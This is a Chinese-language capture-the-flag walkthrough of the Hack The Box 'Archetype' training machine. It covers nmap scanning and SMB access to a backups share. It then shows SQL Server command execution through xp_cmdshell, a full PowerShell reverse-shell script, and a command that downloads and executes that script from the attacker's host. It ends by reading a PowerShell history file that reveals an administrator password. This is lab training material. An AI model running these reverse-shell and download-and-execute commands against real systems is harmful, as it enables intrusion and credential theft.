@@ -1,0 +1,159 @@
+I"�*<h2 id="前言">前言</h2>
+
+<p>心血来潮想试试一些国外的CTF网站试试，然后想起来HTB一直都没有开始，于是在B站看了一下视频打算上手玩一下。</p>
+
+<h2 id="准备">准备</h2>
+
+<p>账号的获取不用多说，网上教程有一大堆，我这里简单讲一下openvpn，这个东西是在linux命令行里面直接跑的，在HTB获取<code class="language-plaintext highlighter-rouge">example.ovpn</code>的pack之后，直接:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openvpn &lt;example.ovpn&gt; 
+</code></pre></div></div>
+
+<p>最后检查一下能不能ping通那个IP</p>
+
+<p>自己的IP也会变，会被分配一个虚拟网卡</p>
+
+<p><img src="..\images\Snipaste_2021-02-01_11-53-48.jpg" alt="Snipaste_2021-02-01_11-53-48" /></p>
+
+<h2 id="信息收集">信息收集</h2>
+
+<p>我做的这个是HTB的新手教程靶机，每一步都有tutorial，因此只要跟着步骤来就可以了</p>
+
+<p>首先是nmap扫描IP的端口</p>
+
+<p>这里用到的命令是</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-vv</span> &lt;指定IP&gt;
+</code></pre></div></div>
+
+<p>用这个可以探测到端口的服务</p>
+
+<p>最后把得到的信息收集起来</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>opened ports:
+445
+135
+139
+1433
+Host script results:
+|_clock-skew: mean: 2h56m05s, deviation: 3h34m41s, median: 1h20m05s
+| ms-sql-info: 
+|   10.10.10.27:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 53066/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 42521/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 45578/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 48474/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-01-31T19:06:00-08:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-01T03:06:03
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h2 id="漏洞探测">漏洞探测</h2>
+
+<p>由于445(SQL Server)和1433(SMB)端口被打开，那么首先从这两个端口入手</p>
+
+<p><img src="..\images\Snipaste_2021-02-01_12-00-12.jpg" alt="Snipaste_2021-02-01_12-00-12" /></p>
+
+<h2 id="漏洞利用">漏洞利用</h2>
+
+<p>可以连接backups，进去之后用get下载里面的文件</p>
+
+<p><img src="..\images\Snipaste_2021-02-01_12-01-53.jpg" alt="Snipaste_2021-02-01_12-01-53" /></p>
+
+<p>可以得到SQL Server的账号密码</p>
+
+<p>使用impactet工具集访问SQL Server</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 mssqlclient.py ARCHETYPE/sql_svc@&lt;IP&gt; <span class="nt">-windows-auth</span>
+</code></pre></div></div>
+
+<p>之后输入密码 连接上SQL Server，依次执行如下命令</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> EXEC sp_configure <span class="s1">'Show Advanced Options'</span>, 1<span class="p">;</span> 
+ reconfigure<span class="p">;</span> 
+ sp_configure<span class="p">;</span> 
+ EXEC sp_configure <span class="s1">'xp_cmdshell'</span>, 1 
+ reconfigure<span class="p">;</span> 
+ xp_cmdshell <span class="s2">"whoami"</span> 
+</code></pre></div></div>
+
+<p>可以发现已经拿到了一个简单的命令执行</p>
+
+<p>试着反弹shell</p>
+
+<p>创建shell.ps1</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"&lt;你的IP&gt;"</span><span class="p">,</span><span class="mi">443</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"# "</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>然后打开自己的服务器</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python3 <span class="nt">-m</span> http.server 80 
+</code></pre></div></div>
+
+<p>打开nc 开启443端口监听</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nc <span class="nt">-lvnp</span> 443
+</code></pre></div></div>
+
+<p>修改入网规则</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ufw allow from 10.10.10.27 proto tcp to any port 80,443 
+</code></pre></div></div>
+
+<p>在SQL Server中执行反弹shell命令</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xp_cmdshell <span class="s2">"powershell "</span>IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://&lt;你的IP&gt;/shell.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span><span class="s2">" 
+</span></code></pre></div></div>
+
+<p><img src="..\images\Snipaste_2021-02-01_12-35-24.jpg" alt="Snipaste_2021-02-01_12-35-24" /></p>
+
+<p>成功反弹回来，这里可以拿到user的flag</p>
+
+<p><img src="..\images\Snipaste_2021-02-01_12-36-36.jpg" alt="Snipaste_2021-02-01_12-36-36" /></p>
+
+<p>使用下面的命令访问PowerShell历史记录文件。</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">type</span><span class="w"> </span><span class="n">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>得到管理员密码</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net.exe</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">T:</span><span class="w"> </span><span class="nx">\\Archetype\backups</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">MEGACORP_4dm1n</span><span class="o">!!</span><span class="w">
+</span><span class="kr">exit</span><span class="w">
+</span></code></pre></div></div>
+
+<p>使用impacket的psexec.py拿到win的管理员权限shell</p>
+
+<p>这里有个坑，直接执行example下面的文件会提示缺少包，需要把包复制一份导入到example中才行</p>
+
+<p><img src="..\\images\Snipaste_2021-02-01_12-42-06.jpg" alt="Snipaste_2021-02-01_12-42-06" /></p>
+
+<p>最后在Desktop处拿下root的flag</p>
+
+<p>结束！</p>
+:ET
